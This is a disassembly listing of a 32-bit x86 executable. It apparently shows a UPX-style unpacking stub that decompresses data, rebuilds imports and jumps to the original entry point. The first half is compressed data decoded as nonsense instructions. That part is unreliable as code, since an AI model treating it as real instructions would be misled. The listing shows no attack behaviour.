  44ee1b:	sbb    DWORD PTR [edi+0x76],eax
  44ee1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ee1f:	sbb    BYTE PTR [ebx+0x5f],0x30
  44ee23:	jne    0x44ee04
  44ee25:	dec    edx
  44ee26:	or     eax,0x49492826
  44ee2b:	add    eax,0xeb35d86c
  44ee30:	add    al,0xb1
  44ee32:	inc    esp
  44ee33:	retf   0x6d2a
  44ee36:	cmp    ch,BYTE PTR [ebx]
  44ee38:	push   0x68
  44ee3a:	call   0x2757:0x816e493c
  44ee41:	or     al,0xa9
  44ee43:	and    al,0x56
  44ee45:	cwde   
  44ee46:	xchg   edx,eax
  44ee47:	or     al,0x21
  44ee49:	jmp    0xd636:0x61af6f54
  44ee50:	adc    bl,BYTE PTR [ebp+0x3f2a1501]
  44ee56:	fld    DWORD PTR [ebp-0x53d79f3e]
  44ee5c:	or     dh,al
  44ee5e:	inc    ecx
  44ee5f:	adc    ebp,DWORD PTR [edx+0x1f]
  44ee62:	or     eax,0x797063ee
  44ee67:	adc    al,0x48
  44ee69:	call   0x40b750d7
  44ee6e:	jns    0x44ee41
  44ee70:	(bad)  
  44ee71:	mov    ebx,0xe2611362
  44ee76:	jo     0x44eeab
  44ee78:	cmc    
  44ee79:	mov    ch,0xfb
  44ee7b:	pop    eax
  44ee7c:	add    DWORD PTR [ebp*2+0x656efa64],esi
  44ee83:	mov    bh,0xc0
  44ee85:	rol    DWORD PTR [ecx+0x67],0x11
  44ee89:	sbb    BYTE PTR [esi],ah
  44ee8b:	(bad)  
  44ee8c:	in     al,dx
  44ee8d:	xchg   edi,eax
  44ee8e:	popa   
  44ee8f:	ret    0x375e
  44ee92:	inc    ecx
  44ee93:	pop    ds
  44ee94:	jae    0x44ee6d
  44ee96:	cmc    
  44ee97:	fimul  WORD PTR [ebx-0x9687a8]
  44ee9d:	not    edi
  44ee9f:	push   ebp
  44eea0:	ret    0x510c
  44eea3:	fild   QWORD PTR [esi+0x68]
  44eea6:	jmp    DWORD PTR [ebp+ecx*8-0x20]
  44eeaa:	scas   al,BYTE PTR es:[edi]
  44eeab:	std    
  44eeac:	jmp    0x44eedc
  44eeae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44eeaf:	push   edx
  44eeb0:	je     0x44ef1e
  44eeb2:	cmp    BYTE PTR [edi-0x7e],dh
  44eeb5:	adc    al,0x24
  44eeb7:	stos   BYTE PTR es:[edi],al
  44eeb8:	xor    DWORD PTR [ebx],edx
  44eeba:	and    BYTE PTR [esi-0x507856bf],al
  44eec0:	repz je 0x44ef3d
  44eec3:	stc    
  44eec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44eec5:	shl    BYTE PTR [edi-0x45],0x43
  44eec9:	mov    edx,0x2d07a387
  44eece:	and    ch,dh
  44eed0:	and    ah,ch
  44eed2:	dec    ebx
  44eed3:	loop   0x44ef20
  44eed5:	gs jns 0x44eef5
  44eed8:	sbb    eax,0xb2f5681e
  44eedd:	fldcw  WORD PTR [esi+eax*1+0x1]
  44eee1:	or     al,0x63
  44eee3:	jo     0x44ef51
  44eee5:	cs out 0xd3,eax
  44eee8:	mov    fs,WORD PTR [eax+0x72]
  44eeeb:	push   edi
  44eeec:	sub    al,0x13
  44eeee:	push   0xe3c03662
  44eef3:	pusha  
  44eef4:	clc    
  44eef5:	sahf   
  44eef6:	pop    DWORD PTR [ebx]
  44eef8:	mov    esp,0xd48dc861
  44eefd:	inc    edi
  44eefe:	cmp    eax,0xf4300d7e
  44ef03:	sbb    eax,DWORD PTR [edx+0x32]
  44ef06:	adc    DWORD PTR [edx+0x6b],eax
  44ef09:	xlat   BYTE PTR ds:[ebx]
  44ef0a:	sbb    eax,0x65701edb
  44ef0f:	adc    eax,0xe6a6c3f
  44ef14:	or     ebx,ebx
  44ef16:	push   ss
  44ef17:	and    esp,DWORD PTR [eax+0x5c951db4]
  44ef1d:	push   0x69
  44ef1f:	add    BYTE PTR [ebp+0x76],0xc6
  44ef23:	es test al,0x47
  44ef26:	push   ds
  44ef27:	xchg   ecx,eax
  44ef28:	loope  0x44eefd
  44ef2a:	test   al,0xd2
  44ef2c:	arpl   WORD PTR [ebx-0x3d],si
  44ef2f:	mov    ds:0xda360c0b,eax
  44ef34:	jne    0x44ef00
  44ef36:	xor    ch,BYTE PTR [edx-0x17]
  44ef39:	enter  0xdafe,0x1e
  44ef3d:	test   al,0x87
  44ef3f:	mov    DWORD PTR [ebp+0x76],esp
  44ef42:	push   0x610e8818
  44ef47:	or     BYTE PTR [ebx+0x3d],dh
  44ef4a:	push   eax
  44ef4b:	popa   
  44ef4c:	cmp    ah,BYTE PTR [eax+0x24]
  44ef4f:	ret    0x44f0
  44ef52:	mov    eax,ds:0x6dbd50d8
  44ef57:	sbb    eax,DWORD PTR gs:[ebx+eax*2-0x25]
  44ef5c:	push   eax
  44ef5d:	pop    edx
  44ef5e:	fist   DWORD PTR gs:[ebx+0x54]
  44ef62:	scas   al,BYTE PTR es:[edi]
  44ef63:	fs pusha 
  44ef65:	cmp    DWORD PTR ds:0xb58571eb,esp
  44ef6b:	jno    0x44efa6
  44ef6d:	mov    WORD PTR [ebp+eax*2+0x49],?
  44ef71:	clc    
  44ef72:	xor    al,0x84
  44ef74:	std    
  44ef75:	inc    edx
  44ef76:	jb     0x44efed
  44ef78:	jae    0x44efe2
  44ef7a:	sub    esp,DWORD PTR [edx+0x1d]
  44ef7d:	adc    al,0x63
  44ef7f:	push   eax
  44ef80:	xor    bh,BYTE PTR [esp+ebx*1]
  44ef83:	test   DWORD PTR [ebp+0x74],ebp
  44ef86:	push   ebp
  44ef87:	ret    0x69f3
  44ef8a:	pop    edi
  44ef8b:	addr16 push 0x273a677a
  44ef91:	call   0x90b97ff8
  44ef96:	test   al,0x9e
  44ef98:	adc    ebx,esp
  44ef9a:	or     dh,0x43
  44ef9d:	push   eax
  44ef9e:	mov    al,ds:0xec7c664f
  44efa3:	sub    DWORD PTR [ecx],esi
  44efa5:	or     al,0x3d
  44efa7:	pop    eax
  44efa8:	jl     0x44efff
  44efaa:	inc    edx
  44efab:	jo     0x44efb6
  44efad:	inc    edx
  44efae:	xor    dh,BYTE PTR [ecx+0xb034c27]
  44efb4:	push   ebp
  44efb5:	mov    ds:0x25bf2064,al
  44efba:	es dec eax
  44efbc:	xor    ecx,DWORD PTR [ebp+0x6f]
  44efbf:	inc    esp
  44efc0:	sbb    DWORD PTR [edx+0x5e04e710],ebx
  44efc6:	arpl   WORD PTR [ebx],bx
  44efc8:	aaa    
  44efc9:	and    esi,DWORD PTR [ecx+eiz*2+0xe8c02de]
  44efd0:	into   
  44efd1:	jl     0x44ef9c
  44efd3:	sbb    eax,0x395d95d7
  44efd8:	adc    al,0xf1
  44efda:	and    ebp,edx
  44efdc:	outs   dx,BYTE PTR ds:[esi]
  44efdd:	sub    ebx,ecx
  44efdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44efe0:	and    esi,DWORD PTR [ecx-0x47cb8fdb]
  44efe6:	bound  eax,QWORD PTR [edx-0x458787ec]
  44efec:	jae    0x44ef8d
  44efee:	sub    DWORD PTR [edx+0xc],ebx
  44eff1:	outs   dx,DWORD PTR ds:[esi]
  44eff2:	fldcw  WORD PTR [edx+0x195f3978]
  44eff8:	dec    ecx
  44eff9:	arpl   WORD PTR [eax+ecx*1-0x4ad7eea5],cx
  44f000:	(bad)  [ebx]
  44f002:	push   ds
  44f003:	lods   eax,DWORD PTR ds:[esi]
  44f004:	fsub   st(5),st
  44f006:	arpl   WORD PTR [eax],bx
  44f008:	xchg   ebp,eax
  44f009:	jmp    0x44f059
  44f00b:	and    al,0x83
  44f00d:	pop    ecx
  44f00e:	fwait
  44f00f:	jmp    0x44f071
  44f011:	inc    ecx
  44f012:	dec    edi
  44f013:	pusha  
  44f014:	inc    ecx
  44f015:	jmp    0x44efa7
  44f017:	imul   ebp,esp,0x60
  44f01a:	cmp    edi,DWORD PTR [edx]
  44f01c:	dec    esp
  44f01d:	jle    0x44f081
  44f01f:	lods   al,BYTE PTR ds:[esi]
  44f020:	jb     0x44f086
  44f022:	out    dx,eax
  44f023:	fisttp QWORD PTR [edx]
  44f025:	imul   ebp,DWORD PTR [ebx],0x48
  44f028:	adc    DWORD PTR [ebp-0x1b010],edx
  44f02e:	call   DWORD PTR [eax+0x45]
  44f031:	add    BYTE PTR [eax],al
  44f033:	dec    esp
  44f034:	add    DWORD PTR [eax],ecx
  44f036:	add    BYTE PTR [ecx],bl
  44f038:	pop    esi
  44f039:	inc    edx
  44f03a:	sub    ah,al
  44f03c:	add    BYTE PTR [edi-0x9fef47f],cl
  44f042:	jge    0x44efc9
  44f044:	test   ah,bh
  44f046:	ds mov esi,0x5c270350
  44f04c:	dec    eax
  44f04d:	xor    al,0x7b
  44f04f:	ficomp WORD PTR [edx]
  44f051:	fcomp  DWORD PTR [esi]
  44f053:	add    DWORD PTR [eax+0x17],eax
  44f056:	add    bh,BYTE PTR [ebx]
  44f058:	jbe    0x44f076
  44f05a:	and    BYTE PTR [edi],cl
  44f05c:	add    al,0x79
  44f05e:	add    al,0x19
  44f060:	fdivr  st(6),st
  44f062:	sbb    ebp,DWORD PTR [edi+0x3d]
  44f065:	inc    ebx
  44f066:	inc    eax
  44f067:	packuswb mm6,QWORD PTR [edi]
  44f06a:	outs   dx,DWORD PTR ds:[esi]
  44f06b:	mov    ebx,0x700113f6
  44f070:	sahf   
  44f071:	jmp    0x31c:0xd4c00e0b
  44f078:	or     bh,cl
  44f07a:	mov    ds:0x1a0c710,eax
  44f07f:	add    ah,ch
  44f081:	sbb    BYTE PTR [ebx-0x6f837ab1],al
  44f087:	add    DWORD PTR [eax],eax
  44f089:	sbb    BYTE PTR [ebx+0x4f],al
  44f08c:	inc    esp
  44f08d:	inc    ebp
  44f08e:	scas   eax,DWORD PTR es:[edi]
  44f08f:	ss mov cl,0xe7
  44f092:	fs clc 
  44f094:	cmp    eax,0x2047043e
  44f099:	push   ss
  44f09a:	sti    
  44f09b:	cs pop eax
  44f09d:	stc    
  44f09e:	pusha  
  44f09f:	inc    esp
  44f0a0:	inc    ecx
  44f0a1:	push   esp
  44f0a2:	inc    ecx
  44f0a3:	pusha  
  44f0a4:	or     bh,dh
  44f0a6:	or     cl,BYTE PTR [esi]
  44f0a8:	inc    edx
  44f0a9:	add    DWORD PTR [edi-0x63],ecx
  44f0ac:	and    bl,BYTE PTR [ecx+0x7]
  44f0af:	inc    eax
  44f0b0:	fs inc edx
  44f0b2:	xor    esi,DWORD PTR [ecx-0x1ab11aa5]
  44f0b8:	pusha  
  44f0b9:	aas    
  44f0ba:	dec    esp
  44f0bb:	dec    edi
  44f0bc:	add    dl,dh
  44f0be:	es pop eax
  44f0c0:	hlt    
  44f0c1:	imul   esp,DWORD PTR cs:[esi+edx*2+0x61],0x4e70e700
  44f0ca:	or     al,0x40
  44f0cc:	add    ch,BYTE PTR [eax]
  44f0ce:	push   ebx
  44f0cf:	inc    eax
  44f0d0:	sar    BYTE PTR [ecx+0x6fd3db92],cl
  44f0d6:	or     al,0x80
  44f0d8:	lahf   
  44f0d9:	pop    eax
  44f0da:	jb     0x44f075
  44f0dc:	xchg   edx,eax
  44f0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f0de:	sbb    ebx,DWORD PTR [eax]
  44f0e0:	dec    edi
  44f0e1:	nop
  44f0e2:	add    al,BYTE PTR [eax-0x65]
  44f0e5:	popa   
  44f0e6:	test   BYTE PTR [esi-0x68859ab0],ah
  44f0ec:	mov    al,ds:0x200ee24e
  44f0f1:	iret   
  44f0f2:	sbb    bl,BYTE PTR [edx+0x73]
  44f0f5:	jb     0x44f143
  44f0f7:	pushf  
  44f0f8:	xchg   edx,eax
  44f0f9:	out    0x9b,al
  44f0fb:	pop    ss
  44f0fc:	ror    BYTE PTR [esi+0x1e],0x3
  44f100:	je     0x44f102
  44f102:	shl    BYTE PTR [eax+0xa],1
  44f105:	jmp    0xec2f:0x731c5836
  44f10c:	or     BYTE PTR [ecx-0x6e],0x24
  44f110:	dec    ecx
  44f111:	add    BYTE PTR [eax],al
  44f113:	add    BYTE PTR [eax-0x1],dl
	...
  44f11e:	add    BYTE PTR [eax],al
  44f120:	pusha  
  44f121:	mov    esi,0x419000
  44f126:	lea    edi,[esi-0x18000]
  44f12c:	push   edi
  44f12d:	jmp    0x44f13a
  44f12f:	nop
  44f130:	mov    al,BYTE PTR [esi]
  44f132:	inc    esi
  44f133:	mov    BYTE PTR [edi],al
  44f135:	inc    edi
  44f136:	add    ebx,ebx
  44f138:	jne    0x44f141
  44f13a:	mov    ebx,DWORD PTR [esi]
  44f13c:	sub    esi,0xfffffffc
  44f13f:	adc    ebx,ebx
  44f141:	jb     0x44f130
  44f143:	mov    eax,0x1
  44f148:	add    ebx,ebx
  44f14a:	jne    0x44f153
  44f14c:	mov    ebx,DWORD PTR [esi]
  44f14e:	sub    esi,0xfffffffc
  44f151:	adc    ebx,ebx
  44f153:	adc    eax,eax
  44f155:	add    ebx,ebx
  44f157:	jae    0x44f164
  44f159:	jne    0x44f183
  44f15b:	mov    ebx,DWORD PTR [esi]
  44f15d:	sub    esi,0xfffffffc
  44f160:	adc    ebx,ebx
  44f162:	jb     0x44f183
  44f164:	dec    eax
  44f165:	add    ebx,ebx
  44f167:	jne    0x44f170
  44f169:	mov    ebx,DWORD PTR [esi]
  44f16b:	sub    esi,0xfffffffc
  44f16e:	adc    ebx,ebx
  44f170:	adc    eax,eax
  44f172:	jmp    0x44f148
  44f174:	add    ebx,ebx
  44f176:	jne    0x44f17f
  44f178:	mov    ebx,DWORD PTR [esi]
  44f17a:	sub    esi,0xfffffffc
  44f17d:	adc    ebx,ebx
  44f17f:	adc    ecx,ecx
  44f181:	jmp    0x44f1d5
  44f183:	xor    ecx,ecx
  44f185:	sub    eax,0x3
  44f188:	jb     0x44f19b
  44f18a:	shl    eax,0x8
  44f18d:	mov    al,BYTE PTR [esi]
  44f18f:	inc    esi
  44f190:	xor    eax,0xffffffff
  44f193:	je     0x44f20a
  44f195:	sar    eax,1
  44f197:	mov    ebp,eax
  44f199:	jmp    0x44f1a6
  44f19b:	add    ebx,ebx
  44f19d:	jne    0x44f1a6
  44f19f:	mov    ebx,DWORD PTR [esi]
  44f1a1:	sub    esi,0xfffffffc
  44f1a4:	adc    ebx,ebx
  44f1a6:	jb     0x44f174
  44f1a8:	inc    ecx
  44f1a9:	add    ebx,ebx
  44f1ab:	jne    0x44f1b4
  44f1ad:	mov    ebx,DWORD PTR [esi]
  44f1af:	sub    esi,0xfffffffc
  44f1b2:	adc    ebx,ebx
  44f1b4:	jb     0x44f174
  44f1b6:	add    ebx,ebx
  44f1b8:	jne    0x44f1c1
  44f1ba:	mov    ebx,DWORD PTR [esi]
  44f1bc:	sub    esi,0xfffffffc
  44f1bf:	adc    ebx,ebx
  44f1c1:	adc    ecx,ecx
  44f1c3:	add    ebx,ebx
  44f1c5:	jae    0x44f1b6
  44f1c7:	jne    0x44f1d2
  44f1c9:	mov    ebx,DWORD PTR [esi]
  44f1cb:	sub    esi,0xfffffffc
  44f1ce:	adc    ebx,ebx
  44f1d0:	jae    0x44f1b6
  44f1d2:	add    ecx,0x2
  44f1d5:	cmp    ebp,0xfffffb00
  44f1db:	adc    ecx,0x2
  44f1de:	lea    edx,[edi+ebp*1]
  44f1e1:	cmp    ebp,0xfffffffc
  44f1e4:	jbe    0x44f1f4
  44f1e6:	mov    al,BYTE PTR [edx]
  44f1e8:	inc    edx
  44f1e9:	mov    BYTE PTR [edi],al
  44f1eb:	inc    edi
  44f1ec:	dec    ecx
  44f1ed:	jne    0x44f1e6
  44f1ef:	jmp    0x44f136
  44f1f4:	mov    eax,DWORD PTR [edx]
  44f1f6:	add    edx,0x4
  44f1f9:	mov    DWORD PTR [edi],eax
  44f1fb:	add    edi,0x4
  44f1fe:	sub    ecx,0x4
  44f201:	ja     0x44f1f4
  44f203:	add    edi,ecx
  44f205:	jmp    0x44f136
  44f20a:	pop    esi
  44f20b:	mov    edi,esi
  44f20d:	mov    ecx,0x984
  44f212:	mov    al,BYTE PTR [edi]
  44f214:	inc    edi
  44f215:	sub    al,0xe8
  44f217:	cmp    al,0x1
  44f219:	ja     0x44f212
  44f21b:	cmp    BYTE PTR [edi],0x1
  44f21e:	jne    0x44f212
  44f220:	mov    eax,DWORD PTR [edi]
  44f222:	mov    bl,BYTE PTR [edi+0x4]
  44f225:	shr    ax,0x8
  44f229:	rol    eax,0x10
  44f22c:	xchg   ah,al
  44f22e:	sub    eax,edi
  44f230:	sub    bl,0xe8
  44f233:	add    eax,esi
  44f235:	mov    DWORD PTR [edi],eax
  44f237:	add    edi,0x5
  44f23a:	mov    al,bl
  44f23c:	loop   0x44f217
  44f23e:	lea    edi,[esi+0x4d000]
  44f244:	mov    eax,DWORD PTR [edi]
  44f246:	or     eax,eax
  44f248:	je     0x44f286
  44f24a:	mov    ebx,DWORD PTR [edi+0x4]
  44f24d:	lea    eax,[eax+esi*1+0x4f260]
  44f254:	add    ebx,esi
  44f256:	push   eax
  44f257:	add    edi,0x8
  44f25a:	call   DWORD PTR [esi+0x4f300]
  44f260:	xchg   ebp,eax
  44f261:	mov    al,BYTE PTR [edi]
  44f263:	inc    edi
  44f264:	or     al,al
  44f266:	je     0x44f244
  44f268:	mov    ecx,edi
  44f26a:	push   edi
  44f26b:	dec    eax
  44f26c:	repnz scas al,BYTE PTR es:[edi]
  44f26e:	push   ebp
  44f26f:	call   DWORD PTR [esi+0x4f304]
  44f275:	or     eax,eax
  44f277:	je     0x44f280
  44f279:	mov    DWORD PTR [ebx],eax
  44f27b:	add    ebx,0x4
  44f27e:	jmp    0x44f261
  44f280:	call   DWORD PTR [esi+0x4f314]
  44f286:	mov    ebp,DWORD PTR [esi+0x4f308]
  44f28c:	lea    edi,[esi-0x1000]
  44f292:	mov    ebx,0x1000
  44f297:	push   eax
  44f298:	push   esp
  44f299:	push   0x4
  44f29b:	push   ebx
  44f29c:	push   edi
  44f29d:	call   ebp
  44f29f:	lea    eax,[edi+0x21f]
  44f2a5:	and    BYTE PTR [eax],0x7f
  44f2a8:	and    BYTE PTR [eax+0x28],0x7f
  44f2ac:	pop    eax
  44f2ad:	push   eax
  44f2ae:	push   esp
  44f2af:	push   eax
  44f2b0:	push   ebx
  44f2b1:	push   edi
  44f2b2:	call   ebp
  44f2b4:	pop    eax
  44f2b5:	popa   
  44f2b6:	lea    eax,[esp-0x80]
  44f2ba:	push   0x0
  44f2bc:	cmp    esp,eax
  44f2be:	jne    0x44f2ba
  44f2c0:	sub    esp,0xffffff80
  44f2c3:	jmp    0x414c5c
  44f2c8:	loopne 0x44f2bc
  44f2ca:	inc    esp
  44f2cb:	add    ah,ch
  44f2cd:	repnz inc esp
  44f2cf:	add    BYTE PTR [eax+0x4150],bl
	...
